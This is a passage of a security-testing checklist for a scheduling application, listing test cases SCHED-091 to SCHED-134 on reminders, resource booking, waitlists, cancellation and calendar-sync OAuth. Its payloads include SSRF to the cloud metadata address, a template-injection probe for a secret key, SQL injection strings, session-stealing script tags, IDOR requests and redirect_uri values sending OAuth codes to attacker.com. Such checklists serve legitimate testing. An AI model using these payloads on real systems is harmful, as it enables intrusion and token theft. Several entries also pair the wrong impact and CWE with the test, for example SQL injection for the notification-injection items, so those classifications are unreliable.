**Test Category:** Server-Side Request Forgery · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Reminders / Alerts

**Test Steps:** 1. Set webhook for reminder 2. Provide internal URL 3. Reminder triggers 4. SSRF

**Expected Result:** Webhook URLs should be validated

**Payload Example:**

```
webhook=http://169.254.169.254/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## SCHED-091 — Reminder Template Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Reminders / Alerts

**Test Steps:** 1. Use reminder template 2. Inject template syntax 3. Template processed 4. Code execution

**Expected Result:** Templates should be sandboxed

**Payload Example:**

```
{{config.secret_key}} in custom message
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite / Tplmap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## SCHED-092 — Push Notification Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Reminders / Alerts

**Test Steps:** 1. Set push notification 2. Inject malicious content 3. Push sent 4. Mobile exploitation

**Expected Result:** Push content should be sanitized

**Payload Example:**

```
Inject deep link to malicious app
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SCHED-093 — Reminder Channel Bypass
**Test Category:** Broken Access Control · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Reminders / Alerts

**Test Steps:** 1. User disabled channel 2. Force send via disabled channel 3. Bypass preference 4. Privacy violation

**Expected Result:** Channel preferences should be enforced

**Payload Example:**

```
Send email when user disabled email reminders
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-094 — Alert Escalation Abuse
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Reminders / Alerts

**Test Steps:** 1. Set alert escalation 2. Escalate to unauthorized users 3. Alert goes to non-entitled 4. Information disclosure

**Expected Result:** Escalation should verify recipients

**Payload Example:**

```
Escalate to admin without permission
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-095 — Resource Booking IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Resource Booking (Rooms/Equipment)

**Test Steps:** 1. Book resource 2. Modify resource_id 3. Book restricted resource 4. Unauthorized access

**Expected Result:** Resource booking should verify access

**Payload Example:**

```
POST /api/bookings {"resource_id":"executive_conference_room"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-096 — Resource Double Booking
**Test Category:** Race Condition · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Resource Booking (Rooms/Equipment)

**Test Steps:** 1. View available resource 2. Submit concurrent bookings 3. Both succeed 4. Resource conflict

**Expected Result:** Booking should prevent double booking

**Payload Example:**

```
Parallel POST requests for same resource slot
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Race-The-Web

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## SCHED-097 — Resource Access Level Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Resource Booking (Rooms/Equipment)

**Test Steps:** 1. User has limited resource access 2. Book premium resource 3. Bypass access level 4. Unauthorized booking

**Expected Result:** Resource access levels should be enforced

**Payload Example:**

```
Regular user booking executive resources
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-098 — Resource Capacity Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Resource Booking (Rooms/Equipment)

**Test Steps:** 1. Book resource with capacity 2. Exceed capacity limit 3. Overbook room 4. Resource misuse

**Expected Result:** Capacity limits should be enforced

**Payload Example:**

```
{"resource_id":"meeting_room",attendees:100} when max is 10
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-099 — Resource Price Manipulation
**Test Category:** Business Logic · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Resource Booking (Rooms/Equipment)

**Test Steps:** 1. Book paid resource 2. Modify price 3. Book at reduced rate 4. Financial loss

**Expected Result:** Price should be server-calculated

**Payload Example:**

```
{"resource_id":"premium_room",price:0.01}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-100 — Resource Booking Extension Abuse
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Resource Booking (Rooms/Equipment)

**Test Steps:** 1. Book resource for 1 hour 2. Extend booking 3. Block resource indefinitely 4. Denial of service

**Expected Result:** Extensions should have limits

**Payload Example:**

```
Extend booking to 999 hours
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-101 — Resource SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Resource Booking (Rooms/Equipment)

**Test Steps:** 1. Search available resources 2. Inject SQL in search 3. Extract all resource data 4. Data breach

**Expected Result:** Search should be parameterized

**Payload Example:**

```
search='; SELECT * FROM resources--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SCHED-102 — Resource Stored XSS in Notes
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Resource Booking (Rooms/Equipment)

**Test Steps:** 1. Book resource with notes 2. Include XSS in notes 3. Admin views booking 4. XSS executes

**Expected Result:** Notes should be sanitized

**Payload Example:**

```
<script>stealAdminSession()</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SCHED-103 — Resource Hidden Availability Access
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Resource Booking (Rooms/Equipment)

**Test Steps:** 1. Resource shows unavailable 2. Access booking endpoint directly 3. Book hidden slots 4. Bypass restrictions

**Expected Result:** Availability should be enforced server-side

**Payload Example:**

```
Book slot shown as maintenance period
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-104 — Resource Cancellation IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Resource Booking (Rooms/Equipment)

**Test Steps:** 1. Cancel own booking 2. Modify booking_id 3. Cancel another's booking 4. Disrupt their schedule

**Expected Result:** Cancellation should verify ownership

**Payload Example:**

```
DELETE /api/bookings/victim_booking_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-105 — Resource Modification IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Resource Booking (Rooms/Equipment)

**Test Steps:** 1. Modify own booking 2. Change booking_id 3. Modify another's booking 4. Resource hijacking

**Expected Result:** Modification should verify ownership

**Payload Example:**

```
PUT /api/bookings/victim_booking_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-106 — Equipment Checkout Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Resource Booking (Rooms/Equipment)

**Test Steps:** 1. Equipment requires checkout 2. Book without checkout 3. Bypass approval 4. Unauthorized equipment use

**Expected Result:** Checkout workflow should be enforced

**Payload Example:**

```
Book equipment without approval step
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-107 — Resource Location Spoofing
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Resource Booking (Rooms/Equipment)

**Test Steps:** 1. Book room 2. Modify location attribute 3. Change meeting point 4. Misdirection

**Expected Result:** Location should match resource

**Payload Example:**

```
{"resource_id":"room_a",location:"secret_location"}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-108 — Waitlist IDOR Access
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Waitlist Management

**Test Steps:** 1. View own waitlist position 2. Modify user_id 3. View others' waitlist status 4. Privacy violation

**Expected Result:** Waitlist access should be user-specific

**Payload Example:**

```
GET /api/waitlist/victim_user_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-109 — Waitlist IDOR Removal
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Waitlist Management

**Test Steps:** 1. Remove self from waitlist 2. Modify user_id 3. Remove others from waitlist 4. Disrupt their booking

**Expected Result:** Removal should verify identity

**Payload Example:**

```
DELETE /api/waitlist/victim_user_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-110 — Waitlist Position Manipulation
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Waitlist Management

**Test Steps:** 1. Join waitlist 2. Modify position parameter 3. Jump to front 4. Unfair advantage

**Expected Result:** Position should be system-controlled

**Payload Example:**

```
{"position":1} to jump queue
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-111 — Waitlist Priority Escalation
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Waitlist Management

**Test Steps:** 1. Join waitlist 2. Modify priority level 3. Get VIP treatment 4. Unauthorized priority

**Expected Result:** Priority should be based on user role

**Payload Example:**

```
{"priority":"vip"} as regular user
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-112 — Waitlist Flooding
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Waitlist Management

**Test Steps:** 1. Join many waitlists 2. Use fake accounts 3. Block legitimate users 4. DoS

**Expected Result:** Waitlist should limit per user

**Payload Example:**

```
Create 1000 waitlist entries
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## SCHED-113 — Waitlist Notification Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Waitlist Management

**Test Steps:** 1. Set waitlist notification 2. Inject in notification field 3. Malicious notification sent 4. Phishing

**Expected Result:** Notifications should be sanitized

**Payload Example:**

```
XSS or phishing link in notification
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SCHED-114 — Waitlist Auto-Promotion Bypass
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Waitlist Management

**Test Steps:** 1. On waitlist 2. Slot opens 3. Bypass promotion order 4. Take slot unfairly

**Expected Result:** Promotion should follow order

**Payload Example:**

```
Race condition on slot opening
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Turbo Intruder / Burp Suite

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-115 — Waitlist Cross-Event Access
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Waitlist Management

**Test Steps:** 1. View waitlist for event A 2. Modify event_id 3. View waitlist for event B 4. Information disclosure

**Expected Result:** Waitlist should be event-scoped

**Payload Example:**

```
GET /api/events/private_event/waitlist
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-116 — Waitlist SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Waitlist Management

**Test Steps:** 1. Query waitlist 2. Inject SQL in filter 3. Extract all waitlist data 4. Data breach

**Expected Result:** Queries should be parameterized

**Payload Example:**

```
event_filter='; SELECT * FROM waitlist--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SCHED-117 — Waitlist Expiry Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Waitlist Management

**Test Steps:** 1. Join waitlist with expiry 2. Modify expiry time 3. Stay on waitlist indefinitely 4. Block others

**Expected Result:** Expiry should be server-controlled

**Payload Example:**

```
{"expires_at":"2099-12-31"}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-118 — Waitlist XSS in Reason Field
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Waitlist Management

**Test Steps:** 1. Join waitlist with reason 2. Include XSS in reason 3. Admin views waitlist 4. XSS executes

**Expected Result:** Reason field should be sanitized

**Payload Example:**

```
<script>stealSession()</script> in reason
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SCHED-119 — Waitlist CSRF
**Test Category:** Cross-Site Request Forgery · **Severity:** Low · **CVSS:** 3.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Waitlist Management

**Test Steps:** 1. Create malicious page 2. Auto-add to waitlist 3. User visits 4. Added without consent

**Expected Result:** Waitlist should require CSRF token

**Payload Example:**

```
<form action="/waitlist/join" method="POST">
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## SCHED-120 — Cancellation IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Cancellation / Rescheduling

**Test Steps:** 1. Cancel own booking 2. Modify booking_id 3. Cancel another's booking 4. Disrupt their schedule

**Expected Result:** Cancellation should verify ownership

**Payload Example:**

```
POST /api/bookings/victim_booking_id/cancel
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-121 — Cancellation Policy Bypass
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Cancellation / Rescheduling

**Test Steps:** 1. Booking within no-cancel period 2. Cancel anyway 3. Bypass policy 4. Avoid penalties

**Expected Result:** Cancellation policy should be enforced

**Payload Example:**

```
Cancel booking 5 minutes before when policy requires 24h
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-122 — Cancellation Refund Manipulation
**Test Category:** Business Logic · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Cancellation / Rescheduling

**Test Steps:** 1. Cancel booking 2. Modify refund amount 3. Get excess refund 4. Financial loss

**Expected Result:** Refund should be calculated server-side

**Payload Example:**

```
{"refund_amount":1000} for $50 booking
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-123 — Rescheduling IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Cancellation / Rescheduling

**Test Steps:** 1. Reschedule own booking 2. Modify booking_id 3. Reschedule another's booking 4. Unauthorized change

**Expected Result:** Rescheduling should verify ownership

**Payload Example:**

```
PUT /api/bookings/victim_booking_id/reschedule
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-124 — Reschedule to Unavailable Slot
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Cancellation / Rescheduling

**Test Steps:** 1. Reschedule booking 2. Select unavailable slot 3. Force booking 4. Overbooking

**Expected Result:** Slot availability should be verified

**Payload Example:**

```
Reschedule to already booked slot
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-125 — Reschedule Fee Bypass
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Cancellation / Rescheduling

**Test Steps:** 1. Reschedule with fee 2. Intercept request 3. Modify fee to zero 4. Avoid charges

**Expected Result:** Fees should be calculated server-side

**Payload Example:**

```
{"reschedule_fee":0}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-126 — Reschedule Limit Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Cancellation / Rescheduling

**Test Steps:** 1. Reschedule has limit 2. Exceed limit 3. Bypass restriction 4. Abuse system

**Expected Result:** Reschedule limits should be enforced

**Payload Example:**

```
Reschedule 100 times when limit is 2
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-127 — Cancellation Reason XSS
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Cancellation / Rescheduling

**Test Steps:** 1. Cancel with reason 2. Include XSS in reason 3. Reason displayed 4. XSS executes

**Expected Result:** Cancellation reasons should be sanitized

**Payload Example:**

```
<script>alert(1)</script> as cancellation reason
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SCHED-128 — Partial Cancellation Abuse
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Cancellation / Rescheduling

**Test Steps:** 1. Book multiple services 2. Cancel expensive ones 3. Keep cheap ones 4. Price manipulation

**Expected Result:** Partial cancellation should recalculate

**Payload Example:**

```
Cancel premium items keeping booking
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-129 — Cancellation Notification Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Cancellation / Rescheduling

**Test Steps:** 1. Cancel booking 2. Inject in notification 3. Malicious notification sent 4. Phishing

**Expected Result:** Notifications should be sanitized

**Payload Example:**

```
Inject phishing link in cancellation email
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Email Analysis

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SCHED-130 — Reschedule to Different Service
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Cancellation / Rescheduling

**Test Steps:** 1. Book service A 2. Reschedule 3. Change to more expensive service B 4. Price arbitrage

**Expected Result:** Service should remain same or price adjusted

**Payload Example:**

```
Reschedule basic to premium without price difference
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-131 — Cancellation Race Condition
**Test Category:** Race Condition · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Cancellation / Rescheduling

**Test Steps:** 1. Cancel booking 2. Simultaneously reschedule 3. Both succeed 4. Inconsistent state

**Expected Result:** Operations should be atomic

**Payload Example:**

```
Parallel cancel and reschedule requests
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## SCHED-132 — Bulk Cancellation IDOR
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Cancellation / Rescheduling

**Test Steps:** 1. Bulk cancel own bookings 2. Include others' IDs 3. Mass cancellation 4. Widespread disruption

**Expected Result:** Bulk operations should verify ownership

**Payload Example:**

```
POST /api/bookings/bulk-cancel {"ids":["own",victim1,victim2]}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-133 — OAuth Token Theft
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Calendar Sync (Google/Outlook)

**Test Steps:** 1. Initiate calendar sync 2. Intercept OAuth flow 3. Steal authorization code 4. Access victim's calendar

**Expected Result:** OAuth should use state parameter and PKCE

**Payload Example:**

```
redirect_uri=https://attacker.com/callback
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Burp Suite / OAuth Tools

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## SCHED-134 — OAuth Redirect URI Manipulation
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Calendar Sync (Google/Outlook)

**Test Steps:** 1. Start OAuth flow 2. Modify redirect_uri 3. Steal tokens 4. Account takeover

**Expected Result:** Redirect URI should be strictly validated

**Payload Example:**

```
redirect_uri=https://attacker.com/callback
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Burp Suite / Manual Testing

